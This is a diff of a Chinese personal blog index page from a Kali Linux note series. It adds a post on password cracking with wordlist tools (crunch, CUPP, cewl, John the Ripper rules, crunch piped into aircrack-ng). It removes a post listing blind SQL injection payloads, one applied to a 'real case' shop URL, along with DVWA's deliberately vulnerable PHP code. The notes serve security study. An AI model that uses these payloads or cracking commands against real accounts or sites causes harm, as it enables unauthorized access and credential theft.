@@ -240,6 +240,337 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/" itemprop="url">Kali Linux笔记(五十九)：密码破解--身份认证、字典</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:29+08:00">
+                2020-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><ul>
+<li>目标系统实施了强安全措施<ul>
+<li>安装了所有补丁</li>
+<li>无任何已知漏洞</li>
+<li>无应用层漏洞</li>
+<li>攻击面最小化（端口最小化，利用化）</li>
+</ul>
+</li>
+<li>社会工程学</li>
+<li>获取目标系统用户身份<ul>
+<li>非授权用户不受信，认证用户可以访问守信资源</li>
+<li>已有用户账号权限受限，需要提权</li>
+<li>不会触发系统报警（非上传木马，用正常管理员登陆）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-身份认证方法"><a href="#2-身份认证方法" class="headerlink" title="2. 身份认证方法"></a>2. 身份认证方法</h4><ul>
+<li>证明你是你声称你是的那个人<ul>
+<li>你知道什么（账号密码、pin、passphrase）</li>
+<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
+<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
+<li>以上方法结合使用（多因素身份认证）</li>
+</ul>
+</li>
+<li>基于互联网的身份认证仍以账号密码为主要形式</li>
+</ul>
+<h4 id="3-密码破解方法"><a href="#3-密码破解方法" class="headerlink" title="3. 密码破解方法"></a>3. 密码破解方法</h4><ul>
+<li>人工猜解<ul>
+<li>垃圾桶工程</li>
+<li>被动信息收集</li>
+</ul>
+</li>
+<li>基于字典暴力破解（主流）</li>
+<li>键盘空间字符爆破</li>
+<li>字典<ul>
+<li>保存有用户和密码的文本文件</li>
+<li>/usr/share/wordlist</li>
+<li>/usr/share/wfuzz/wordlist</li>
+<li>/usr/share/seclists</li>
+<li>▲ rockyou.txt</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-字典–Crunch"><a href="#4-字典–Crunch" class="headerlink" title="4. 字典–Crunch"></a>4. 字典–Crunch</h4><ul>
+<li>键盘空间字符爆破<ul>
+<li>全键盘空间字符</li>
+<li>部分键盘空间字符（基于规则）</li>
+<li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li>
+</ul>
+</li>
+<li>crunch <min-len><max-len>[<charset string>][options]<ul>
+<li><charset string>默认是小写字符</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></strong><ul>
+<li>-b（按大小分割【kb/kib、mb/mib、gb/gib】）kb、mb、gb → 1000/kib、mib、gib → 1024</li>
+<li>-c（每个字典的行数）</li>
+<li>以上两个参数必须与-o START结合使用</li>
+<li>-d（同一字符连贯出现数量【11/aaa】）</li>
+</ul>
+</li>
+<li>字符集<ul>
+<li><strong><code>🔺命令：cat /usr/share/crunch/charset.lst</code></strong></li>
+<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></strong></li>
+</ul>
+</li>
+<li>无重复字符集<ul>
+<li><strong><code>🔺命令：crunch 1 1 -p（指定字符作为生成字符） 1234567890 | more</code></strong></li>
+<li>必须是最后一个参数</li>
+<li>最大、最小字符长度失效，但必须存在</li>
+<li>与-s参数不兼容（-s指定起始字符串）</li>
+<li><strong><code>🔺命令：crunch 4 4 0123456789 -s 9900</code></strong></li>
+</ul>
+</li>
+<li>读取文件中每行内容作为基本字符生成字典<ul>
+<li><strong><code>🔺命令：crunch 1 1 -q</code></strong> read（文件中每段简单设置为一个字符，然后进行拼接调换）</li>
+<li>最小、最大字符长度失效，但必须存在</li>
+<li>每段在生成的字典文件中，每行只出现一次（4行文件=4<em>3</em>2*1=24行字典）</li>
+</ul>
+</li>
+<li>字典组成规则<ul>
+<li><strong><code>🔺命令：crunch 6 6 -t @,%%^^ | more</code></strong></li>
+<li>@：小写字母 lalpha</li>
+<li>,：大写字母 ualpha</li>
+<li>%：数字 numeric</li>
+<li>^：符号 symbols</li>
+</ul>
+</li>
+<li>输出文件压缩<ul>
+<li><strong><code>🔺命令：crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></strong></li>
+<li>其他压缩格式：gzip、bzip2、lzma</li>
+<li>-7z压缩比率最大</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lsb mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></strong>（@表示字符集所有组合，特殊情况）</li>
+<li><strong><code>🔺命令：crunch 4 5 -p dog cat bird</code></strong>（后面三个词语是为三个基本字符）</li>
+<li><strong><code>🔺命令：crunch 5 5 abc DEF + \!@# -t ,@^%,</code></strong> （从指定的字符中挑选）<ul>
+<li><ul>
+<li>占位符（表示所有）</li>
+</ul>
+</li>
+<li>\ 转义符（空格、符号）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 5 5 -t ddd%% -p dog cat bird</code></strong><ul>
+<li>任何不同于-p 参数指定的值都是占位符</li>
+<li>d无效，不同于-p </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：crunch 5 5 -d 2@ -t @@@%%</code></strong>（小写字母不能超过两个连续相同）</li>
+<li>组合应用（边生成边使用边丢弃）<ul>
+<li><strong><code>🔺命令：crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –</code></strong></li>
+<li><strong><code>🔺命令：crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="5-字典–CUPP"><a href="#5-字典–CUPP" class="headerlink" title="5. 字典–CUPP"></a>5. 字典–CUPP</h4><ul>
+<li>按个人信息生成其专属的密码字典（适合破解个人信息的个人账号密码）</li>
+<li>CUPP：Common User Password Profiler<ul>
+<li><strong><code>🔺命令：git clone https://github.com/Mebus.cupp.git</code></strong></li>
+<li><strong><code>🔺命令：python cupp.py -i</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="6-字典–cewl"><a href="#6-字典–cewl" class="headerlink" title="6. 字典–cewl"></a>6. 字典–cewl</h4><ul>
+<li>通过收集网站信息生成字典</li>
+<li><strong><code>🔺命令：cewl 1.1.1.1（或域名） -m 3 -d 3 -e -c -v -w a.txt</code></strong><ul>
+<li>-m（最小单词长度）</li>
+<li>-d（爬网深度）</li>
+<li>-e（收集包含email地址信息）</li>
+<li>-c（每个单词出现次数）</li>
+<li>支持基本、摘要身份认证</li>
+<li>支持代理</li>
+</ul>
+</li>
+<li>用户密码变型<ul>
+<li>基于cewl得结果进行密码变型</li>
+<li>末尾增加数字串</li>
+<li>字母大小写变化</li>
+<li>字母与符号相互转换</li>
+<li>字母与数字相互转换</li>
+<li>P@$$w0ord</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-字典–John-the-Ripper"><a href="#7-字典–John-the-Ripper" class="headerlink" title="7. 字典–John the Ripper"></a>7. 字典–John the Ripper</h4><ul>
+<li>使用John the Ripper配置文件实现密码动态变型</li>
+<li>/etc/john/john.conf<ul>
+<li>[List.Rules:Wordlist]</li>
+<li>$[0-9]$[0-9]$[0-9]</li>
+<li><strong><code>🔺命令：cat a.txt | head -n 10 | cut -d &quot;,&quot; -f 1 &gt;  p.lst</code></strong>（a.txt为cewl生成的文件）</li>
+<li><strong><code>🔺命令：john --wordlist=p.lst --rules --stdout &gt; m.txt</code></strong></li>
+<li><strong><code>🔺命令：wc -l m.txt</code></strong>（查看m.txt里面有多少条记录）<br>– [List.Rules:test] $[0-9]$[0-9]$[0-9]$[a-zA-Z] $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[<code>~!@#$%^&amp;*()\-_=+]
+– **</code>🔺命令：john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt<code>**
+– **</code>🔺命令：john –wordlist=ahm.lst –rules=test HASHFILE`**</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3500,239 +3831,6 @@ A：可用性（Availability）指保证合法用户对信息和资源的使用�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  763 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-判断技术"><a href="#1-判断技术" class="headerlink" title="1. 判断技术"></a>1. 判断技术</h4><ul>
-<li>不显示数据库内建的报错信息<ul>
-<li>内建的报错信息帮助开发人员发现和修复问题</li>
-<li>报错信息提供关于系统的大量有用信息</li>
-</ul>
-</li>
-<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即为盲注</li>
-<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
-<li>1’ and 1=1–+</li>
-<li>1’ and 1=2–+</li>
-<li>1’ order by 5–+  假</li>
-<li>1’ order by 2–+  真</li>
-<li>1’ union select 1,2–+</li>
-<li>1’ union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())–+</li>
-<li>1’ and 1=0 union select null,table_name from information_schema.tables#</li>
-<li>1’ and 1=0 union selcet null,table_name from information_schema.colums where table_name=’users’#</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-猜字段–无information-scheme"><a href="#2-猜字段–无information-scheme" class="headerlink" title="2. 猜字段–无information_scheme"></a>2. 猜字段–无information_scheme</h4><ul>
-<li>无权读取information_shcema库/拒绝union、order by语句<ul>
-<li>猜列名：1’ and user is not null–+</li>
-<li>猜当前表名：1’ and table.user is not null–+</li>
-<li>猜库里其他表：1’ and (select count() from table)&gt;0–+</li>
-<li>列表对应关系：1’ and users.user is not null–+</li>
-<li>猜字段内容：1’ and user=’admin’/1’ or user like ‘%a’</li>
-<li>猜账号对应密码：2’ or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99</li>
-<li>▲ Burpsuite自动化猜解内容</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-真实实例"><a href="#3-真实实例" class="headerlink" title="3. 真实实例"></a>3. 真实实例</h4><ul>
-<li>开个脑洞<ul>
-<li>真实案例：某电商网站</li>
-<li><a href="http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt=1&amp;goodsid=123</a></li>
-<li>and 1=1–+  显示一包面巾纸</li>
-<li>and 1-2–+  显示一袋洗衣粉</li>
-<li>1’ and ORD(MID((VERSION()),1,1))&amp;（1/2/4/8/16/32/64/128）&gt;0–+</li>
-<li>CURRENT_USER()、DATABASE()</li>
-<li>MID用法：MID(ColumnName,Start [,Length])</li>
-<li>ORD用法：ORD(string)   #ASCII码</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-DVWA的SQL盲注源码"><a href="#4-DVWA的SQL盲注源码" class="headerlink" title="4. DVWA的SQL盲注源码"></a>4. DVWA的SQL盲注源码</h4><ul>
-<li>DVWA的SQL Injection(Blind) Source（Low）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的SQL Injection(Blind) Source（Medium）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line">    $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line">    </span><br><span class="line">    $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first=mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last=mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的SQL Injection(Blind) Source（High）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id)) &#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid); // Removed &apos;or die&apos; to suppres mysql errors</span><br><span class="line"></span><br><span class="line">        $num = @mysql_numrows($result); // The &apos;@&apos; character suppresses errors making the injection &apos;blind&apos;</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3787,7 +3885,7 @@ A：可用性（Availability）指保证合法用户对信息和资源的使用�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">126</span>
+                  <span class="site-state-item-count">127</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3894,7 +3992,7 @@ A：可用性（Availability）指保证合法用户对信息和资源的使用�
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">112.9k</span>
+    <span title="Site words total count">113.7k</span>
   
 </div>
 
